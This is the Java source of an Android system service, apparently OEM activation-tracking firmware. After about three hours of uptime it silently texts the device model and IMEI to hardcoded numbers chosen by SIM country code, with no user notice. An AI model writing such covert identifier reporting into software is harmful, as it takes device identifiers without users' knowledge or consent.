package com.chenlong.smsservice;

import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.os.SystemProperties;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.List;
import com.android.internal.telephony.ISms;
import android.os.ServiceManager;
import android.os.RemoteException;

public class TimerService extends Service {
	private static final String TAG = "SmsService.x";
    
    public static final boolean Debug = true;
    
	private static final int EVENT_UPDATE_STATS = 1001;
	public static final int LIMIT_TIME_MINUTES = 180;
	private static final long DELTA_TIME = 60*1000;
	private static final long RETRY_TIME = 10*60*1000;
    public static final int STATE_REGISTERED = -77;
    public static final int MP_VERNO = 3;
	
	public static final String TAGET = "+919582943043";
    public static String FINAL_TARGET="";
    private static final String HEAD_MP = "MOB ";
    private static final String HEAD_AFTER_SERVICE = "SER ";
	public static final int CMD_BOOT_COMPLETED = 1;
	public static final String START_CMD = "start_cmd";

	private Handler mHandler = new MyHandler();
	private static int oldTime = 0;
	private static int newTime = 0;
    private static int finalSendSmsSubID = -1;
	private class MyHandler extends Handler {
		@Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case EVENT_UPDATE_STATS: {
                Log.d(TAG, "TimerService > EVENT_UPDATE_STATS");
                if (mHandler.hasMessages(EVENT_UPDATE_STATS)) {
                    Log.d(TAG, "TimerService > hasMessages - EVENT_UPDATE_STATS");
                    mHandler.removeMessages(EVENT_UPDATE_STATS);
                }

				int ut = (int)(SystemClock.elapsedRealtime() / 1000);

				if (ut == 0) {
					ut = 1;
				}
				newTime = oldTime + ut;
                int hour = (int) (newTime / 3600);
				int minute = (int) ((newTime / 60) % 60);
                Log.d(TAG, "hour = " + hour + ", minute = " + minute);
                minute += hour * 60;
                Log.d(TAG, "minute = " + minute);
                int limitTime;
                int debugLimitTime = getLimitTimeForDebug();
                Log.d(TAG, "debugLimitTime = " + debugLimitTime);
                if (debugLimitTime > 0) {
                    limitTime = debugLimitTime;
                } else {
                    limitTime = LIMIT_TIME_MINUTES;
                }
                Log.d(TAG, "limitTime = " + limitTime);
                if (minute < limitTime) {
                    setTime(newTime);
                    sendEmptyMessageDelayed(EVENT_UPDATE_STATS, DELTA_TIME);
                } else {
                    if (register(TimerService.this)) {
                        Utils.writeNVData(STATE_REGISTERED);
                        
                        stopSelf();
                    } else {
                        sendEmptyMessageDelayed(EVENT_UPDATE_STATS, RETRY_TIME);
                    }
                }
				break;
			}
			default:
				break;
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Log.d(TAG, "TimerService > onCreate");
	}

	@Override
	@Deprecated
	public void onStart(Intent intent, int startId) {
		Log.d(TAG, "TimerService > onStart");
        boolean registered =  Utils.readNVData() == STATE_REGISTERED;
        //if (registered) {
        if (registered || !RightMCC()) {
            Log.d(TAG, "TimerService > onStart Done!");
            stopSelf();
        } else {
            int cmd = -1;
            if (intent != null) {
                cmd = intent.getIntExtra(START_CMD, -1);
            }
        	oldTime = getTime();
        	if (cmd == CMD_BOOT_COMPLETED) {
        		Log.d(TAG, "TimerService > onStart CMD_BOOT_COMPLETED*");
        	} else {
        		Log.d(TAG, "TimerService > onStart ~CMD_BOOT_COMPLETED#");
        		int ut = (int)(SystemClock.elapsedRealtime() / 1000);
				if (ut == 0) {
					ut = 1;
				}
				
        		oldTime -= ut;
        	}
    		mHandler.sendEmptyMessage(EVENT_UPDATE_STATS);
        }
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "TimerService > onStartCommand");
		return super.onStartCommand(intent, flags, startId);
	}
	
	@Override
	public void onDestroy() {
		Log.d(TAG, "TimerService onDestroy");
		super.onDestroy();
	}

	private boolean register(Context context) {
        Log.d(TAG, "TimerService > register");
		TelephonyManager mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		boolean isSimReady = (mTelephonyManager.getSimState()==TelephonyManager.SIM_STATE_READY);
		boolean isAirplaneMode = Settings.System.getInt(context.getContentResolver(),
					Settings.System.AIRPLANE_MODE_ON, 0) != 0;
        boolean registered =  Utils.readNVData() == STATE_REGISTERED;
		if (isSimReady && !isAirplaneMode && !registered) {
            Log.d(TAG, "TimerService > Do - register");
			boolean isSerVersion = Utils.isCurrentVersionSER();
            if (isSerVersion) {
            	int verno = Utils.getCurrentVersion();
            	Utils.writeSERVersionNVFlag(verno);
            } else {
            	Utils.writeSERVersionNVFlag(0);
            }
            String modelName = SystemProperties.get("ro.product.model", "").trim();
			String IMEI = mTelephonyManager.getDeviceId();
			String head = isSerVersion ? HEAD_AFTER_SERVICE : HEAD_MP;
			String body = head + modelName + " " +IMEI;
			SmsManager sm = getSmsManager(context);
            if (sm == null) {
                return false;
            }
            String debugTarget = getTargetForDebug();
            String number="";
            if (debugTarget == null) {
                //sm.sendTextMessage(TAGET, null, body, null, null);
                //sm.sendTextMessage(finalSendSmsSubID,TAGET, null, body, null, null);
                sm.sendTextMessage(finalSendSmsSubID,FINAL_TARGET, null, body, null, null);
                number = FINAL_TARGET;
            } else {
                //sm.sendTextMessage(debugTarget, null, body, null, null);
                sm.sendTextMessage(finalSendSmsSubID,debugTarget, null, body, null, null);
                number = debugTarget;
            }
            SharedPreferences mSharedPreferences = getSharedPreferences(
                        "smsservice", Activity.MODE_PRIVATE);
            SharedPreferences.Editor mEditor = mSharedPreferences.edit();
            mEditor.putString("number", number);
            mEditor.commit();
			return true;
		}
		Log.d(TAG, "TimerService > Not - register");
		return false;
	}
    
    private SmsManager getSmsManager(Context context) {
        //int subId = getSmsManagerSubId(context);
        finalSendSmsSubID = getSmsManagerSubId(context);
        //if(subId == -1) {
        if(finalSendSmsSubID == -1) {
            return null;
        } else {
            return SmsManager.getSmsManagerForSubscriptionId(finalSendSmsSubID);
        }
    }

    /**
     * finds a record with slotId.
     * Since the number of SIMs are few, an array is fine.
     */
    private int getSmsManagerSubId(Context context) {
        final List<SubscriptionInfo> subInfoList =
                SubscriptionManager.from(context).getActiveSubscriptionInfoList();
        int subId = -1;
        Log.d(TAG, "TimerService > getSmsManagerSubId");
        if (subInfoList != null && subInfoList.size() > 0) {
            final int subInfoLength = subInfoList.size();
            Log.d(TAG, "TimerService > subInfoLength="+subInfoLength);
            //for (int i = 0; i < subInfoLength; ++i) {
            //    final SubscriptionInfo sir = subInfoList.get(i);
            //    if (sir.getSimSlotIndex() == 0/*slot 1*/) {
            //         subId = sir.getSubscriptionId();
            //        Log.d(TAG, "TimerService > Slot 1 = " + subId);
            //    } else if (subId == -1/*still default value*/ ||  subInfoLength == 1/*slot 2 only*/) {
            //        subId = sir.getSubscriptionId();
            //        Log.d(TAG, "TimerService > Slot 2 = " + subId);
            //    }
            //}
            SubscriptionInfo si;
            ISms mSmsManager = ISms.Stub.asInterface(ServiceManager.getService("isms"));
            if (mSmsManager == null) {
                Log.d(TAG, "isSimMessageAccessable mSmsManager is null");
                return subId;
            } else {
                if (subInfoLength == 1) {
                    Log.d(TAG, "subInfoLength == 1");
                    si = subInfoList.get(0);
                    int Mcc0 = si.getMcc();
                    if (RightMCC(Mcc0)){
                        subId = si.getSubscriptionId();
                        FINAL_TARGET = getTarget(Mcc0);
                    }
                } else if (subInfoLength == 2){
                    Log.d(TAG, "subInfoLength == 2");
                    si = subInfoList.get(0);
                    int Mcc1 = si.getMcc();
                    boolean isSimReady = false;
                    try {
                        //isSimReady = mSmsManager.isSmsReadyForSubscriber(0);
                        Log.d(TAG, "si.getSubscriptionId():"+si.getSubscriptionId());
                        isSimReady = mSmsManager.isSmsReadyForSubscriber(si.getSubscriptionId());
                    } catch (RemoteException e) {
                        Log.d(TAG, "isSimMessageAccessable failed to get sms state");
                        isSimReady = false;
                    }
                    Log.d(TAG, "isSimReady-0 = "+isSimReady);
                    if (RightMCC(Mcc1) && isSimReady){
                        subId = si.getSubscriptionId();
                        FINAL_TARGET = getTarget(Mcc1);
                    } else {
                        si = subInfoList.get(1);
                        int Mcc2 = si.getMcc();
                        try {
                            //isSimReady = mSmsManager.isSmsReadyForSubscriber(1);
                            Log.d(TAG, "si.getSubscriptionId():"+si.getSubscriptionId());
                            isSimReady = mSmsManager.isSmsReadyForSubscriber(si.getSubscriptionId());
                        } catch (RemoteException e) {
                            Log.d(TAG, "isSimMessageAccessable failed to get sms state");
                            isSimReady = false;
                        }
                        if (RightMCC(Mcc2) && isSimReady){
                            Log.d(TAG, "isSimReady-1 = "+isSimReady);
                            subId = si.getSubscriptionId();
                            FINAL_TARGET = getTarget(Mcc2);
                        }
                    }
                }
            }
        }
        Log.d(TAG, "TimerService > getSmsManagerSubId,subId="+subId);
        Log.d(TAG, "TimerService > getSmsManagerSubId,FINAL_TARGET="+FINAL_TARGET);
        return subId; 
    }
    
	private void setTime(int time) {
		Log.d(TAG, "setTime, " + time);
        int data = time;
        Utils.writeNVData(data);
	}

	private int getTime() {
		int time = 0;
        int data = Utils.readNVData();
        if (data != STATE_REGISTERED &&  data < 0) {
            Log.d(TAG, "getTime, data < 0! {" + data + "}");
            Utils.writeNVData(0);
        }
        time = data;
		Log.d(TAG, "getTime, " + time);
		return time;
	}
    
    private int getLimitTimeForDebug() {
        if (!Debug) {
            Log.d(TAG, "getLimitTimeForDebug, -1,A" );
            return -1;
        }
        SharedPreferences mSharedPreferences = getSharedPreferences(
					"smsservice", Activity.MODE_PRIVATE);
        String min = mSharedPreferences.getString("minute", null);
        if(min == null) {
            Log.d(TAG, "getLimitTimeForDebug, -1,B" );
            return -1;
        }
        if (min != null && min.isEmpty()){
            Log.d(TAG, "getLimitTimeForDebug, -1,C" );
            return -1;
        }
        int time = Integer.parseInt(min);
        Log.d(TAG, "getLimitTimeForDebug, " + time);

        return time;
    }
    
    private String getTargetForDebug() {
        if (!Debug) {
            Log.d(TAG, "getTargetForDebug, null,A" );
            return null;
        }
        SharedPreferences mSharedPreferences = getSharedPreferences(
					"smsservice", Activity.MODE_PRIVATE);
        String number = mSharedPreferences.getString("number", null);
        Log.d(TAG, "getTargetForDebug, " + number);
        if (number != null && number.isEmpty()){
            Log.d(TAG, "getTargetForDebug, null,B" );
            return null;
        }
        return number;
    }
    
    public boolean RightMCC() {
        List<SubscriptionInfo> subInfoList =
                SubscriptionManager.from(TimerService.this).getActiveSubscriptionInfoList();
        if (subInfoList == null || subInfoList.size() < 1) {
            Log.d(TAG, "isSimMessageAccessable SIM not insert");
            return false;
        } else {
            int subInfoLength = subInfoList.size();
            SubscriptionInfo si;
            Log.d(TAG, "RightMCC > subInfoLength="+subInfoLength);
            if (subInfoLength == 1) {
                si = subInfoList.get(0);
                int Mcc = si.getMcc();
                Log.d(TAG, "subInfoList.get(0)");
                return RightMCC(Mcc);
            } else if (subInfoLength == 2){
                si = subInfoList.get(0);
                int Mcc1 = si.getMcc();
                if (RightMCC(Mcc1)){
                    Log.d(TAG, "subInfoList.get(0)--length");
                    return true;
                }
                si = subInfoList.get(1);
                int Mcc2 = si.getMcc();
                Log.d(TAG, "subInfoList.get(1)");
                return RightMCC(Mcc2);
            } else {
                return false;
            }
        }
    }

    public boolean RightMCC (int mcc){
        if (mcc == 404 || mcc == 405 || mcc == 406 || mcc == 413 || mcc == 429 ||  mcc == 470 || mcc == 460){
            Log.d(TAG, "Mcc:"+mcc+"--return true");            
            return true;
        }
        Log.d(TAG, "Mcc:"+mcc+"--return false");  
        return false;
    }

    public static String getTarget(int mcc) {
        switch (mcc){
            case 404:
            case 405:
            case 406:
                return "+919582943043";
            case 413:
                return "+94115920989";
            case 429:
                return "4636";
            case 470:
                return "38001";
            case 460:
                return "18621323137";
        }
        return "";
    }
    //private static final int[] MccArray = {404,405,406,413,429,470};
}
